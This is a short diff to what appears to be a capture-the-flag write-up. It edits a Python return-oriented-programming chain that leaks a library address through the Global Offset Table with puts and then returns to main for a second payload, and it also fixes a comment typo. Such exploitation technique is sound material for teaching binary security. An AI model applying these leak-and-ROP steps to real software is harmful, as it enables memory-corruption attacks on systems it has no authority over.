@@ -38,8 +38,8 @@ ret2win_offset = 0x974
 Leak the address:  
 
 ```python3
-addr_leak = ([
-    foothold_plt,   # Populate the Global Offset Table with addresses. The inmported function from the shared library is used.
+addr_leak = flat([
+    foothold_plt,   # Populate the Global Offset Table with addresses. The imported function from the shared library is used.
     puts_plt,       # Use puts to output the address of foothold_function in the Global Offset Table
     main_ptr,       # Run main again so that we can provide a new payload to call the target function
     foothold_got    # Argument for puts, the address to leak
